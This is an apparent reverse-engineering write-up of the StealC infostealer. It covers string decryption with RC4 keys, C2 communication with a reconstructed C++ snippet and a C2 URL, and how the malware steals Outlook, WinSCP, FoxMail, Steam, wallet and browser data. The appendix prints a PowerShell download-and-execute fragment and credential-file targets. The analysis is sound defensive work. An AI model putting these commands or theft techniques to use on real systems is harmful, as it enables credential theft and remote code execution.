# Part 2 - StealC

In this part 2 I will go into the loaded malware by Amadey, StealC.  
StealC is an information-stealing malware sold MaaS. It has been active since January 2023 and has recently been taken down by law enforcement in June 2026. 

**MITRE ATT&CK mapping**
| ID | Meaning |
|---|---|
|T1027.007|Obfuscated Files or Information: Dynamic API Resolution|
|T1555.003 | Credentials from Web Browsers|
|T1113 | Screen Capture |
|T1082 | System Information Discovery|
| T1012 | Query Registry |
| T1005 | Data from Local System |
| T1071 | Application Layer Protocol| 
| T1140 | Deobfuscate/Decode Files or Information| 
| T1041 | Exfiltration Over C2 Channel |

**Language:** C++  
**Dropped By:** Amadey  
**RC4 key (strings):** Osi2yzncUKrppHAEnF  
**RC4 key (data transfer):** 263a115d5c8a49b6abe0

### Identified Strings
List of analysis-related strings:  
![alt text](/assets/images/StealC/image.png)![alt text](/assets/images/StealC/image-2.png)

Folder to cached data:  
- `"\Google\Chrome\User Data\Local State"`
- `"\BraveSoftware\Brave-Browser\User Data\Local State"`
- `"\Microsoft\Edge\User Data\Local State"`
- `"Software\Martin Prikryl\WinSCP 2\Sessions"`
- `"soft\Steam\tokens\steam_tokens.txt"`
- `"\Steam\local.vdf"`

Other: 
- `"C:\\builder_v2\\stealc\\json.h"`
- `"steal_foxmail"`
- `"steal_winscp"`

## Phase 1 - Setup

### RC4 + Base64
StealC uses a combination of RC4 stream cipher and Base64 as its main data encryption/decryption algorithm.  
This is quite a common combination, RC4 turns the data into unreadable bytes and Base64 makes sure no data is lost during transmission via URL's, API's, etc.  

![Decryption Flow](/assets/images/StealC/decryption-flow.png)

### Resolve Strings & API's: 
In the first phase these two algorithms get used to decrypt strings.  
StealC uses the following hardcoded RC4 key: `"Osi2yzncUKrppHAEnF"`.

Decoding the strings we get:  

| Encoded string |Decoded string |
| --- | --- |
| "bFFNs+GqSEawrjy5BLtggUtgO64=" |"263a115d5c8a49b6abe0" |
| "bl8="|"08" |
| "b1c="| "10"|
| "bFc="| "20"|
| "bFE="| "26"|
| "NQIMvLX3ThCrqWi0"|"kernel32.dll" |
| "PwMIs6DyThCrqWi0"| "advapi32.dll"|
| "GQIKgqL0HmPhqXa9Q/E="| "GetProcAddress"|
| "EggftpzyH1Dkv32Z"| "LoadLibraryA"|
| "Gx8XpoDpEkHgvnc="| "ExitProcess"|
| "HQsRobXTHEzhoWE="| "CloseHandle"|
| "GQIKh6P+D2bgq2WtXPZO1kRlF9o="|"GetUserDefaultLangId" |
| "ERcbvJXtGEzxmg=="|"OpenEventW" |
| "HRUbs6T+OFTgo3CP"|"CreateEventW"|
| "DQsbt6A="| "Sleep"|
| "GQIKkb/2DVfxqHaWUe9n4A=="| "GetComputerNameW"|
| "GQIKh6P+D2zkoGGP"| "GetUserNameW"|


After this the following API's are dynamically resolved using `GetProcAddress`:  
*GetProcAddress, LoadLibraryA, ExitProcess, CloseHandle, GetUserDefaultLangId, OpenEventW, CreateEventW, Sleep, GetComputerNameW, GetUserNameW*

### Geo fencing
Using the `GetUserDefaultLangId` function, the malware checks the default language set in the OS. The malware will exit if the primary language is set to one of these:  
`0x0419-Russian`, `0x0422-Ukrainian`, `0x0423-Belarusian`, `0x043F-Kazakh`, `0x0443-Uzbek Latin  `

*Note: This is the only somewhat "anti-analysis" related mechanism in this specific StealC build. This is likely because the file was dropped by Amadey, which already handled that part.*

### Creating an Event
StealC makes sure it is not already running by using the `OpenEventW()` function. If there is no instance of itself running yet, it will call `CreateEventW()` and make a new event called **7FF6F47C8380[ComputerName][UserName]**. 

## Phase 2 - Stealing and Sending

Again first thing done in the second phase is the decryption of strings and the resolving of API's. 

### 250 decrypted strings
This time StealC decrypts a total of 250 strings, each decryption looks like this:  
![string decryption](/assets/images/StealC/string-decryption.png)

I used the following script from @hsauers5 https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071 for the RC4 decoding in Python. Combining this with a simple Base64 decoding we get the following list of strings. 

| Encrypted | Decrypted |
| --- | --- |
| NhMKouq0UhO8+yrqBbMshho1cK9UXw | http://196.251.107.130 | 
| cVZIsOCpTxu89WLvBbYzhB1gaK4GQW | /16b022998f754137b60a.php | 
| OQMXorzuDgzhoWg=               | gdiplus.dll | 
| PRUHoqSoTwzhoWg=               | crypt32.dll | 
| OQMX4eK1GU7p                   | gdi32.dll | 
| LBQKoKT2GlCrqWi0               | rstrtmgr.dll | 
| ...               | | 
| **View the rest of the list in the [appendix](#appendix)** | |

---

*View the Python RC4 + Base64 decryption script I used **[here](https://github.com/LucasAlgera/LucasAlgera.github.io/blob/main/pages/StealC/rc4_and_base64.py)**.*

### Communication with C2 - Receiving stealer config
After having decrypted and resolved all API's, StealC starts receiving and sending data from/to it's C2 server. It communicates to the C2 over php: `http://196.251.107.130/16b022998f754137b60a.php` and uses InternetCrackUrlW() to parse this URL.    

StealC's C2 communication roughly looks as follows:  
![C2 communication](/assets/images/StealC/communication.png)

It uses the following Windows API functions to establish a connection with the C2 Server and retrieve it's stealing configuration:  

```cpp
// Establish HTTP session
hInternet = InternetOpenW(user_agent);
hConnect = InternetConnectW(hInternet, C2Server, URL.port);
hRequest = HttpOpenRequestW(hConnect, L"POST", objName);

HttpSendRequestW(hRequest,lpszHeaders,HeaderLen, pDataToSend); 

//Returns HTTP status Code
status = HttpQueryInfoA(hRequest,0x13,&querybuf,querybuflen);

if (status == HTTP_STATUS_OK) 
{
    while (InternetReadFile(hRequest, chunk))
    {
        appendString(responseBuffer, chunk);
    }

    // Decoding the received instructions
    decoded  = DecodeBase64(responseBuffer);
    config_json = DecodeBaseRC4(decoded , RC4_KEY);
    config = ParseJSON(config_json);
}
```

StealC will send the following JSON packet to the server and uses the drive's hwid for identification. 
```json
"{\n    \"build\": \"23x06x2026\",\n    \"hwid\": \"642DCFF1-ED0A-181D-EEE9-B2555661DA0D\",\n    \"type\": \"create\"\n}"
```

### Sending System info
After having received it's configuration, StealC will send it's first stolen data. This is the system/user info.  All info is sent in JSON format and then encrypted using the RC4 + Base64 combination.  
`263a115d5c8a49b6abe0` is it's key for RC4 data transfer. 

```
// Base 64 + RC4 Encrypted data
{
"access_token": "<server_generated_token>"
    
"data": 
    Network Info:
        - IP: <found IP>
        - Country: ISO?

    System Summary:
        - HWID: 642DCFF1-ED0A-181D-EEE9-B2555661DA0D
        - OS: 10.0 (Build 1337)
        - Architecture: x64
        - UserName: malware
        - Computer Name: DESKTOP-LDKI6BA
        - Local Time: 2026-06-26 16:54:48
        - UTC: 1
        - Language: en-NL
        - Keyboards: English (United States) / English (United Kingdom)
        - Laptop: 
}
```

### StealC's capabilities
After having sent the initial batch of system data, StealC will decide on what to steal depending on the received configurations.  
![stealing structure](/assets/images/StealC/structure.png)

In this build, StealC can do the following: 
- Execute Shell commands
- Steal Outlook credentials
- Steal Foxmail credentials
- Steal WinSCP credentials
- Steal docs/(crypto) Wallets 
- Steal Steam files/tokens
- Take Screenshots

### Executing Shell commands
StealC has 3 different Shell execution options. 
1. **Executing a File** It can use Shell to execute a file as a process, which it does by populating a _SHELLEXECUTEINFOA structure which it feeds into `ShellExecuteExA()`. It feeds the following CLSID values into `SHGetFolderPathA()` paths to determine what folder to download the file to:      
**- csidl:** 0x1c = `"C:\Users\<Username>\AppData\Local"`  
**- csidl:** 0x1a = `"C:\Users\<Username>\AppData\Roaming"`  
**- csidl:** 0x10 = `"C:\Users\<Username>\Desktop"`  
**- csidl:** 0x28 = `"C:\Users\<Username>"`  
**- csidl:** 0x05 = `"C:\Users\<Username>\Documents"`  
**- csidl:** 0x26 = `"C:\Program Files"`  
![ShellExecuteFILE](/assets/images/StealC/image-4.png)


2. **Executing a Command**
To execute a command via the server `ShellExecuteExA()` is used. Though this time the _SHELLEXECUTEINFOA.lpFile is filled in with "powershell.exe". And the _SHELLEXECUTEINFOA.lpParameters is filled with a string consisting of the `Invoke-WebRequest` command and `Invoke-Expression` parameter. This could mean that either a command or secondary payload is gathered and executed from the C2 server. 

3. **Installing an MSI file**
To install and execute an msi file again `ShellExecuteExA()` is used. This time _SHELLEXECUTEINFOA.lpFile is filled in with "C:\Windows\system32\msiexec.exe". Again the same CSIDL structure as above is used. The C2 configuration supplies this function with what file to download. 

### Steal Outlook credentials
StealC's Outlook stealer utilizes the Windows Registry to steal information. It traverses through the following registries:  
![outlook regs](/assets/images/StealC/image-5.png)  
The stealer targets Outlook versions 2010 through 2019/365 (registry paths 13.0–16.0).

It opens the `"9375CFF0413111d3B88A00104B2A6676"` key using `RegOpenKeyExA()`. This number is also known as the Outlook MAPI profile GUID. It's used to store Outlook related profile settings in the Windows Registry.    
In this MAPI GUID it will look in subkey idx `00000001` through `00000004`. Every subkey maps to a different account logged into Outlook on that user's machine. Within this subkey the stealer can find the following information/credentials: server names, account names, UIDs, etc.  

In modern Outlook there are no direct encrypted passwords stored in the registry. However, when StealC finds a key which has the string "Password" in it, it uses `CryptUnprotectData()` to decrypt that data.  
![alt text](/assets/images/StealC/image-8.png)  

Eventually all data is stored in a file called "outlook.txt", this data is then sent back to the C2. 

### Steal FoxMail credentials
For data theft related to FoxMail, StealC relies on the recovery files present in the FoxMail installpath. It will navigate to `"\\Accounts\\Account.rec0"`.  
This file is then copied and sent over to the C2 server. No decryption is done. 

### Steal WinSCP credentials
StealC starts by checking whether any WinSCP sessions exist in by opening registry key `"Software\\Martin Prikryl\\WinSCP 2\\Sessions"`. WinSCP uses the Windows Registry to store hosts, usernames and passwords. StealC targets unencrypted passwords stored in the registry.  
After all info is gathered, it will format it into a file looking something like this:  
```
Found <amount found>
session(s):

Session:    ...
Host:       ...
Port:       ...
User:       ...
Password:   ...
-----------------------------------

<other sessions found>
```

These contents are stored in a file called `"soft\\WinSCP\\winscp.txt"` and send it over to the C2. 


### Steal docs/(crypto) Wallets 
Wallets are discovered and stolen by recursively going over all files in a set starting path (again using CLSID paths).   
Config strings that are related to this functionality are: `masks`, `recursive`, `max_size`, `csidl`, `start_path`, `iterations`.

StealC starts by entering a for loop which loops over all the set masks in the C2 config.  
![for loop](/assets/images/StealC/image-10.png)

`FindFirstFileA()` is used to find files in a directory with the supplied masks. 

When all setup is done, it enters a while(true) loop. Every found file is masked against a given list of strings.  
![while loop](/assets/images/StealC/image-9.png)

When a file is found using the mask, the file is grouped in either `wallets`, `files` or `soft` for exfiltration.  
When a folder is found, the function calls itself (hence the recursivity). 

In the end found files are temporarily copied before being sent to the C2 server. 

This means that just like the rest of StealC, this is a config driven steal. Only the files that match the set mask by the attacker get stolen. 

### Steal Steam files/tokens
The stealer starts by discovering Steam's install path.  
It does this by going into the registry and querying `"Software\Valve\Steam -> InstallPath"`.  
When into the Steam path, it goes into the `"config"` folder, which is where some of the userdata is stored. 

The Steam stealing happens in 2 ways:
1. **Steal Masked Files** function used in the earier part of the stealer. Only this time the supplied config mask is stored as an encrypted string. All the following files are stolen: `ssfn*`,`config.vdf`,`DialogConfig.vdf`,`DialogConfigOverlay*.vdf`,`libraryfolders.vdf`,`loginusers.vdf`.

2. **Session Token Theft** is done by opening `<SteamPath>\config\config.vdf`. Here it navigates through the VDF tree like this:  
    ```
    "InstallConfigStore"
    {
        "Software"
        {
            "Valve"
            {
                "Steam"
                {
                    "Accounts"
                    {
                        "account_name"
                        {
                            "SteamID"		"<steam_id>"
    } } } } } }
    ```  
    For each account it extracts: `Account Name`, `ConnectCacheID`, `Token`. The token is decrypted using `CryptUnprotectData()`.  
    The output is formatted like this `"Account: / ConnectCacheID: / Token:"`.

    The results are written to `soft\Steam\tokens\steam_tokens.txt` and thereafter sent to the C2 server. 

### Take Screenshot
StealC offers the option to take a screenshot. if C2_config.take_screenshot is true, the following code gets run:  
![screenshot](/assets/images/StealC/image-12.png)

TakeScreenShot eventually comes down to the following:  
![screenshot](/assets/images/StealC/image-11.png)

GetSystemMetrics(0x4e/0x4f) (SM_CXVIRTUALSCREEN/SM_CYVIRTUALSCREEN) means multi-monitor setups are fully captured.

A buffer is filled with screendata, stored in `screenshot.jpg` and then sent to the C2 server. 


### Leaked path
Scattered around in the code are these JSON-validators. In these validators we can see the following string which shows the dev path for the StealC malware.  
`"C:\\builder_v2\\stealc\\json.h"`


## IOC's
| name |||
| --- | --- | --- |
| <?>.exe |	(SHA-256) d5cad85a993f432900438b0b241f62226f2709cc7d2a0ab6897f58009eb4d670	|784.384 bytes|	
|196.251.107.130/16b022998f754137b60a.php | | |
|RC4 key (strings) |Osi2yzncUKrppHAEnF  ||
|RC4 key (data transfer)| 263a115d5c8a49b6abe0||
| Event name| 7FF6F47C8380[ComputerName][UserName]||





## Appendix

### 250 decrypted strings
| Encrypted | Decrypted |
| --- | --- |
| NhMKouq0UhO8+yrqBbMshho1cK9UXw | http://196.251.107.130 | 
| cVZIsOCpTxu89WLvBbYzhB1gaK4GQW | /16b022998f754137b60a.php | 
| OQMXorzuDgzhoWg=               | gdiplus.dll | 
| PRUHoqSoTwzhoWg=               | crypt32.dll | 
| OQMX4eK1GU7p                   | gdi32.dll | 
| LBQKoKT2GlCrqWi0               | rstrtmgr.dll | 
| MQsb4eK1GU7p                   | ole32.dll | 
| KQ4QuqTvDQzhoWg=               | winhttp.dll | 
| KxQboOOpU0bpoQ==               | user32.dll | 
| LQ8SpbHrFAzhoWg=               | shlwapi.dll | 
| LQ8bvryoTwzhoWg=               | shell32.dll | 
| MBMavry1GU7p                   | ntdll.dll | 
| GQMXopf+CWvorGO9dexh2E5nLO00Bm | GdipGetImageEncodersSize | 
| GQMXopf+CWvorGO9dexh2E5nLO0=   | GdipGetImageEncoders | 
| GQMXopPpGEPxqEaxRO9jx2xwMfMvLV | GdipCreateBitmapFromHBITMAP | 
| GQMXorzuDnHxrHasRfI=           | GdiplusStartup | 
| GQMXorzuDnHtuHC8X/Vs           | GdiplusShutdown | 
| GQMXooP6C0fMoGW/VdZt5F5wO/8K   | GdipSaveImageToStream | 
| GQMXopTyDlLqvmGRXeNl0g==       | GdipDisposeImage | 
| DAIZg6X+D1vTrGitVcd69g==       | RegQueryValueExA | 
| DAIZl77uEGngtEGgcQ==           | RegEnumKeyExA | 
| DAIZg6X+D1vTrGitVcd64A==       | RegQueryValueExW | 
| DAIZnaD+E2ngtEGgZw==           | RegOpenKeyExW | 
| DAIZkbz0DkfOqH0=               | RegCloseKey | 
| HQgQpLXpCXHxv222V9Fn1F9wN+oeK3 | ConvertStringSecurityDescriptorToSecurityDescriptorA | 
| DAIZnaD+E2ngtEGgcQ==           | RegOpenKeyExA | 
| HRUHoqTOE1L3onC9U/ZG1l5j       | CryptUnprotectData | 
| HRUHoqTICVDso2OMX8Br2UtwJ98=   | CryptStringToBinaryA | 
| HRUHoqTZFEzkv32MX9F2xUNsOd8=   | CryptBinaryToStringA | 
| HRUbs6T+Pk3ovWWsWeBu0mhrKvMGHw | CreateCompatibleBitmap | 
| DQISt7PvMkDvqGes               | SelectObject | 
| HRUbs6T+Pk3ovWWsWeBu0m5B       | CreateCompatibleDC | 
| GgISt6T+OWE=                   | DeleteDC | 
| GgISt6T+MkDvqGes               | DeleteObject | 
| HA4KkLzv                       | BitBlt | 
| DAo5t6TXFFHx                   | RmGetList | 
| DAost7fyDlbgv1a9Q+13xUlnLQ==   | RmRegisterResources | 
| DAotprHpCXHgvnexX+w=           | RmStartSession | 
| DAo7vLTIGFH2pGu2               | RmEndSession | 
| HRUbs6T+Llb3qGW1f+xK8EZtPP8L   | CreateStreamOnHGlobal | 
| GQIKganoCUfogGGsQuthxA==       | GetSystemMetrics | 
| GQIKlpM=                       | GetDC | 
| DAISt7HoGGbG                   | ReleaseDC | 
| GQIKmbXiH03kv2CUUfttwl5ON+0T   | GetKeyboardLayoutList | 
| GwkLv5TyDlLprH2cVfRr1E9xCQ==   | EnumDisplayDevicesW | 
| GwkLv5TyDlLprH2LVfZ23kRlLck=   | EnumDisplaySettingsW | 
| KRQOoLn1CUTE                   | wsprintfA | 
| DgYKup36CUHtnnS9U8M=           | PathMatchSpecA | 
| DRMMkb3rPmM=                   | StrCmpCA | 
| DQ8bvrzeBUfmuHC9dfpD           | ShellExecuteExA | 
| DS85t6TdEk7hqHaIUfZq9g==       | SHGetFolderPathA | 
| GA4QtpbyD1Hxi220VcM=           | FindFirstFileA | 
| GA4Qtp7+BVbDpGi9cQ==           | FindNextFileA | 
| GA4QtpP3ElHg                   | FindClose | 
| MhQKoLP6CWM=                   | lstrcatA | 
| HQgOq5byEUfE                   | CopyFileA | 
| GgISt6T+O0vpqEU=               | DeleteFileA | 
| CRUXprXdFE7g                   | WriteFile | 
| HRUbs6T+O0vpqFM=               | CreateFileW | 
| DAIftpbyEUc=                   | ReadFile | 
| GQIKlLn3GHHst2GdSA==           | GetFileSizeEx | 
| HRUbs6T+M0PoqGCIWfJn9g==       | CreateNamedPipeA | 
| MhQKoLz+E2M=                   | lstrlenA | 
| GQIKl77tFFDqo2m9XvZU1lhrP/wLCl | GetEnvironmentVariableA | 
| Eggds7zaEU7qrg==               | LocalAlloc | 
| Eggds7zdD0fg                   | LocalFree | 
| DAITvab+OUv3qGesX/B79g==       | RemoveDirectoryA | 
| DQIKl77tFFDqo2m9XvZU1lhrP/wLCl | SetEnvironmentVariableA | 
| HRUbs6T+OUv3qGesX/B79g==       | CreateDirectoryA | 
| GQIKkaXpD0fruVSqX+FnxFlLOg==   | GetCurrentProcessId | 
| GQIKh6P+D2bgq2WtXPZO2EljMvspDn | GetUserDefaultLocaleName | 
| GQIKganoCUfonWuvVfBRw0t2K+0=   | GetSystemPowerStatus | 
| GQIKnr/4HE7ghGq+X9U=           | GetLocaleInfoW | 
| GQIKhL/3CE/ghGq+X/Bv1l5rMfAm   | GetVolumeInformationA | 
| GQIKhbn1GU3yvkCxQudhw0VwJ98=   | GetWindowsDirectoryA | 
| HRUbs6T+KU3qoWy9XPIxhXlsP+4UB3 | CreateToolhelp32Snapshot | 
| GQIKhrn2GHjqo2GRXuRtxUdjKvcIAQ | GetTimeZoneInformation | 
| GQIKnrHoCWf3v2uq               | GetLastError | 
| GQIKnr/8FEHkoVSqX+FnxFltLNcJCX | GetLogicalProcessorInformationEx | 
| DhURsbXoDhG3g2GgRNU=           | Process32NextW | 
| DhURsbXoDhG3i22qQ/ZV           | Process32FirstW | 
| GQIKganoCUfohGq+Xw==           | GetSystemInfo | 
| GQIKnr/4HE7RpGm9               | GetLocalTime | 
| GQsRsLH3MEfoonahY/Zjw19xG+Y=   | GlobalMemoryStatusEx | 
| CRUXprXLD03mqHerfedv2Fh7       | WriteProcessMemory | 
| CQYXppb0D3Hso2O0Vc1g3U9hKg==   | WaitForSingleObject | 
| DAINp73+KUr3qGW8               | ResumeThread | 
| DxIbp7XODkf3jFSb               | QueueUserAPC | 
| CA4MpqX6EWPpoWu7dfo=           | VirtualAllocEx | 
| CA4MpqX6EWT3qGGdSA==           | VirtualFreeEx | 
| HRUbs6T+LVDqrmGrQ8M=           | CreateProcessA | 
| HQYQsbX3NE0=                   | CancelIo | 
| FgIfopbpGEc=                   | HeapFree | 
| CgIMv7n1HFbgnXa3U+dxxA==       | TerminateProcess | 
| FVRMlbXvME3huGi9dutu0mRjM/siF0 | K32GetModuleFileNameExW | 
| ERcbvIDpEkHgvnc=               | OpenProcess | 
| GQIKlLn3GGPxuXaxUvd20llD       | GetFileAttributesA | 
| DAINt6TeC0fruQ==               | ResetEvent | 
| FgIfopH3EU3m                   | HeapAlloc | 
| DAIftpTyD0fmuWuqScFq1kRlO+0w   | ReadDirectoryChangesW | 
| GQIKlLn3GHHst2E=               | GetFileSize | 
| GQIKgqL0Hkf2vky9UfI=           | GetProcessHeap | 
| CQ4at5PzHFDRokmtXPZr9VN2Ow==   | WideCharToMultiByte | 
| GQIKganoCUfomW21VQ==           | GetSystemTime | 
| DBMSlbXvK0f3vm23Xg==           | RtlGetVersion | 
| KQYSvrXvDg==                   | wallets | 
| OA4St6M=                       | files | 
| LQgYpg==                       | soft | 
| HV0igqL0GlDkoEC5RONe           | C:\ProgramData\ | 
| HQgQprX1CQ/RtHS9CqJjx1puN/0GG3 | Content-Type: application/json\r\n | 
| Digthg==                       | POST | 
| MRcdvbT+                       | opcode | 
| OgYKsw==                       | data | 
| OA4St776EEc=                   | filename | 
| KxcSvbH/IkTsoWE=               | upload_file | 
| MRQhsaLiDVY=                   | os_crypt | 
| OwkdoKnrCUfhkm+9SQ==           | encrypted_key | 
| NQIHoQ==                       | keys | 
| KFZO/KTjCQ==                   | v10.txt | 
| KFVO/KTjCQ==                   | v20.txt | 
| EAIKpb/pFg==                   | Network | 
| HQgRubn+Dg==                   | Cookies | 
| EggZu767OUPxrA==               | Login Data | 
| CQIc8pT6CUM=                   | Web Data | 
| Fg4Npr/pBA==                   | History | 
| PBURpaP+D1E=                   | browsers | 
| LgsLtbn1Dg==                   | plugins | 
| Eggds7y7OFrxqGqrWe1sl3lnKuoOAX | Local Extension Settings | 
| DR4QsfDeBVbgo3exX+wi5E92KvcJCG | Sync Extension Settings | 
| Fwkat6j+GWbH                   | IndexedDB | 
| HTIsgJXVKQ==                   | CURRENT | 
| PQ8Mvb3+Ikf9uWG2Q+tt2XU=       | chrome_extension_ | 
| AVchu77/GFrgqWC6b+5nwU9uOvw=   | _0_indexeddb_leveldb | 
| Eggds7y7LlbkuWE=               | Local State | 
| Gl1Wk+ugOmO+9j+PdKs=           | D:(A;;GA;;;WD) | 
| DiYqmg==                       | PATH | 
| MBQN4f7/EU4=                   | nss3.dll | 
| EDQtjZn1FFY=                   | NSS_Init | 
| EDQtjYPzCFbhonO2               | NSS_Shutdown | 
| DixP44/cGFbMo3C9Quxj22FnJ80LAG | PK11_GetInternalKeySlot | 
| DixP44/dD0fgnmi3RA==           | PK11_FreeSlot | 
| DixP44/aCFbtqGqsWeFjw08=       | PK11_Authenticate | 
| DixP44PfL33BqGeqSfJ2           | PK11SDR_Decrypt | 
| MggZu77oU0j2omo=               | logins.json | 
| MggZu77o                       | logins | 
| NggNpr76EEc=                   | hostname | 
| OwkdoKnrCUfhmHe9Quxj2k8=       | encryptedUsername | 
| OwkdoKnrCUfhnWWrQ/VtxU4=       | encryptedPassword | 
| LgYNoaf0D0b243CgRA==           | passwords.txt | 
| PBURpaP+Dxil                   | browser:  | 
| LhURtLn3GBil                   | profile:  | 
| KxUS6PA=                       | url:  | 
| MggZu76hXQ==                   | login:  | 
| LgYNoaf0D0a/7Q==               | password:  | 
| PQgRubn+Dgz2vGixROc=           | cookies.sqlite | 
| OAgMv7jyDlbqv332Q/Nu3l5n       | formhistory.sqlite | 
| LgsfsbXoU1H0oW2sVQ==           | places.sqlite | 
| LhURtLn3GFGrpGqx               | profiles.ini | 
| CjUrlw==                       | TRUE | 
| GCYygZU=                       | FALSE | 
| FiYslofaL2fZiUGLc9BL535LEdA7PG | HARDWARE\DESCRIPTION\System\CentralProcessor\0 | 
| DhURsbXoDk33g2W1VdF2xUNsOQ==   | ProcessorNameString | 
| bkc5kA==                       | 0 GB | 
| fiA8                           |  GB | 
| DSg4hofaL2fZgG27Qu1x2Ex2AskOAX | SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall | 
| Gg4Norz6BGzkoGE=               | DisplayName | 
| Gg4Norz6BHTgv3exX+w=           | DisplayVersion | 
| MAYTtw==                       | name | 
| LgYKug==                       | path | 
| LQgYpo/rHFbt                   | soft_path | 
| KxQbjaapTQ==                   | use_v20 | 
| Kh4Otw==                       | type | 
| LgYMobXEHk3qpm29Qw==           | parse_cookies | 
| LgYMobXEEU3ipGqr               | parse_logins | 
| LgYMobXEFUv2uWuqSQ==           | parse_history | 
| LgYMobXECkfnqWWsUQ==           | parse_webdata | 
| KggVt74=                       | token | 
| OBURv4/3EkHkoQ==               | from_local | 
| OBURv4/oBEzm                   | from_sync | 
| OBURv4/SE0bgtWG8dMA=           | from_IndexedDB | 
| PRQXtrw=                       | csidl | 
| LRMfoKTEDUPxpQ==               | start_path | 
| MwYNuaM=                       | masks | 
| LAIdp6LoFFTg                   | recursive | 
| MwYGjaPyB0c=                   | max_size | 
| NxMboLHvFE3rvg==               | iterations | 
| LRIdsbXoDg==                   | success | 
| PwQdt6PoIlbqpmG2               | access_token | 
| LQIStI//GE7guWE=               | self_delete | 
| KgYVt4/oHlDgqGqrWO12           | take_screenshot | 
| MggftrXp                       | loader | 
| LRMbs7zEDlbgrGk=               | steal_steam | 
| LRMbs7zEElfxoWu3Ww==           | steal_outlook | 
| PAsRsbv+GQ==                   | blocked | 
| KxUS                           | url | 
| LBIQjbHoIkPhoG22               | run_as_admin | 
| PRUbs6T+                       | create | 
| NhAXtg==                       | hwid | 
| PBIXvrQ=                       | build | 
| OggQtw==                       | done | 
| EAIKpb/pFgLMo2K3Cg==           | Network Info: | 
| V0pem4ChXWvV8g==               | 	- IP: IP? | 
| V0pekb/uE1b3tD74edFNiHZsAvA0Fm | 	- Country: ISO?\n\nSystem Summary: | 
| V0pemofSORil                   | 	- HWID:  | 
| V0penYOhXQ==                   | 	- OS:  | 
| CwkVvL/sEw==                   | Unknown | 
| fk88p7n3GQI=                   |  (Build  | 
| V0pek6L4FUvxqGesRfBnjQp6aKo=   | 	- Architecture: x64 | 
| V0peh6P+D2zkoGHiEA==           | 	- UserName:  | 
| V0pekb/2DVfxqHb4fuNv0hAi       | 	- Computer Name:  | 
| V0penr/4HE6lmW21Vbgi           | 	- Local Time:  | 
| V0peh4TYRwI=                   | 	- UTC:  | 
| V0penrH1GlfkqmHiEA==           | 	- Language:  | 
| V0pembXiH03kv2CrCqI=           | 	- Keyboards:  | 
| V0penrHrCU319yQ=               | 	- Laptop:  | 
| V0pegKX1E0vrqiSIUfZqjQo=       | 	- Running Path:  | 
| V0pekYDORwI=                   | 	- CPU:  | 
| V0pekb/pGFG/7Q==               | 	- Cores:  | 
| V0pehrjpGEPhvj74               | 	- Threads:  | 
| V0pegJHWRwI=                   | 	- RAM:  | 
| V0pelrnoDU7ktCSKVfFt2192N/EJVT | 	- Display Resolution:  | 
| V24zvb7yCU337Q==               | 	Monitor  | 
| V253lrXtFEHg7Uq5Xec4lw==       | Device Name:  | 
| V253lrXtFEHg7VesQuts0BAi       | Device String:  | 
| V253gLXoEk7wuW23Xrgi           | Resolution:  | 
| V253kb/3ElCliWGoROo4lw==       | Color Depth:  | 
| fgUXpqO7DUf37XSxSOdu           | bits per pixel | 
| V0pelYDORw==                   | 	- GPU: | 
| DhURsbXoDgLmonG2RLgi           | Process count:  | 
| DhURsbXoDgLJpHesCqI=           | Process List:  | 
| GxUMvaK7GVfovW22V6JyxUVhPfsUHD | Error dumping proccess list | 
| FwkNprH3EUfh7UWoQPE4           | Installed Apps: | 
| HwsS8oXoGFD29w==               | All Users: | 
| HRIMoLX1CQLQvmGqCg==           | Current User: | 
| LR4NprX2Ikvrq2v2RPp2           | system_info.txt | 
| cAIGtw==                       | .exe | 
| LBIQs6M=                       | runas | 
| cwkRovC2HgI=                   | -nop -c  | 
| cAoNuw==                       | .msi | 
| cRcfoaPyC0c=                   | /passive | 
| LQQMt7X1DkrquSqyQOU=           | screenshot.jpg | 
| DQgYpqf6D0fZm2W0Rude5F5nP/M=   | Software\Valve\Steam | 
| DRMbs73LHFbt                   | SteamPath | 
| AgQRvLbyGn4=                   | \config\ | 
| DRMbs70=                       | Steam | 
| HyU9lpXdOmrMh0+UfcxN53tQDcoyOU | ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ | 
| PwUdtrX9Gkrsp2+0Xextx1twLeoSGW | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | 
| HV0ihbn1GU3yvliLSfFV+H00asIwBn | C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe | 
| NwIG+p7+Cg/Kr269U/Yi+U92cMkCDV | iex(New-Object Net.WebClient).DownloadString(' | 
| HV0ihbn1GU3yvlirSfF20kcxbMIKHH | C:\Windows\system32\msiexec.exe | 
| LRQYvPq3Hk3rq22/HvRm0QZGN/8LAH | ssfn*,config.vdf,DialogConfig.vdf,DialogConfigOverlay*.vdf,libraryfolders.vdf,loginusers.vdf | 